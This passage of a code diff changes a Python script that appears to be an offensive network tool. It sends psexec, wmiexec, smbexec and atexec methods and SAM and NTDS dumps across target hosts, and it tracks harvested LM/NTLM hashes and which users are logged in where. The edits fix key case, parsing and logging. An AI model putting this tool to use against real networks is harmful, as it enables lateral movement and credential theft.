-            creds_dict = not_in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
-        message += "[+] %s is logged into %s \n" % (temp_key, ip)
+    if data:
+        for line in data.splitlines():
+            mutate = []
+            logged_in_temp = []
+            access_to_temp = []
+            mutate = line.split()
+            ip = mutate[0]
+            ip = ip.strip(':')
+            temp_key = mutate[2]
+            dom_temp, usr_temp = temp_key.split("\\")
+            if not (dom_temp is dom):
+                dom_temp = "WORKGROUP"
+            temp_key = dom_temp.lower() + "\\" + usr_temp.lower()
+            message += "[+] %s is logged into %s \n" % (temp_key, ip)
+            print(message) #DEBUG
+    else:
+        dom_temp = dom.lower()
+        ip = dst
+        print(dom_temp, usr_temp) #DEBUG
+        temp_key = dom_temp.lower() + "\\" + usr_temp.lower()
+        message = "[+] %s is logged into %s \n" % (temp_key, ip)
+    if temp_key in creds_dict:
+        creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
+        logged_in_temp = creds_dict[temp_key][9]
+        access_to_temp = creds_dict[temp_key][10]
+        logged_in_temp.append(ip)
+        set = sets.Set(logged_in_temp)
+        logged_in_temp = list(set)
+        access_to_temp.append(ip)
+        set = sets.Set(access_to_temp)
+        access_to_temp = list(set)
+        creds_dict[temp_key][9] = logged_in_temp
+        creds_dict[temp_key][10] = access_to_temp
+    else:
+        logged_in_temp.append(ip)
+        set = sets.Set(logged_in_temp)
+        logged_in_temp = list(set)
+        access_to_temp.append(ip)
+        set = sets.Set(access_to_temp)
+        access_to_temp = list(set)
+        creds_dict = not_in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
     return(message, creds_dict)
 
 def access_to_method(verbose, creds_dict, dom, data, usr, pwd, ip):
@@ -4545,7 +4602,7 @@ def access_to_method(verbose, creds_dict, dom, data, usr, pwd, ip):
     cached_temp = None
     logged_in_temp = []
     access_to_temp = []
-    temp_key = dom_temp + "\\" + usr_temp
+    temp_key = dom_temp.lower() + "\\" + usr_temp.lower()
     if temp_key in creds_dict:
         creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
         access_to_temp = creds_dict[temp_key][10]
@@ -4809,7 +4866,7 @@ Create Pasteable Executor Attack:
         recovery = True
         try:
             print("[*] Attempting to write data for recovery as necessary!")
-            data_writer(creds_dict, dst, final_targets, recovery)
+            data_writer(creds_dict, dst, final_targets, recovery, logger_obj)
         except Exception, e:
             print("[!] Failed to write data to files, the following error occured : %s") % (e)
         finally:
@@ -5144,11 +5201,11 @@ Create Pasteable Executor Attack:
                     pwd = value[5]
                     dom = value[6]
                     for dst in final_targets:
-                        method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder, timeout_value, sleep_value, logger_obj, output_cat, methods, creds_dict)
+                        creds_dict = method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder, timeout_value, sleep_value, logger_obj, output_cat, methods, creds_dict)
                         time.sleep(sleep_value)
             else:
                 for dst in final_targets:
-                    method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder, timeout_value, sleep_value, logger_obj, output_cat, methods, creds_dict)
+                    creds_dict = method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder, timeout_value, sleep_value, logger_obj, output_cat, methods, creds_dict)
                     time.sleep(sleep_value)
         except (Exception, KeyboardInterrupt), e:
             print("[!] An error occurred: %s") % (e)
@@ -5167,18 +5224,16 @@ Create Pasteable Executor Attack:
                     pwd = value[5]
                     dom = value[6]
                     for dst in final_targets:
-                        method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder, timeout_value, sleep_value, logger_obj, output_cat, methods, creds_dict)
+                        creds_dict = method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder, timeout_value, sleep_value, logger_obj, output_cat, methods, creds_dict)
                         time.sleep(sleep_value)
             else: 
                 for dst in final_targets:
-                    method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder, timeout_value, sleep_value, logger_obj, output_cat, methods, creds_dict)
+                    creds_dict = method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output, encoder, timeout_value, sleep_value, logger_obj, output_cat, methods, creds_dict)
                     time.sleep(sleep_value)
         except (Exception, KeyboardInterrupt), e:
             print("[!] An error occurred: %s") % (e)
 
-    data_writer(creds_dict, dst, final_targets, recovery)   
+    data_writer(creds_dict, dst, final_targets, recovery, logger_obj)   
 
 if __name__ == '__main__':
     main()
-
-
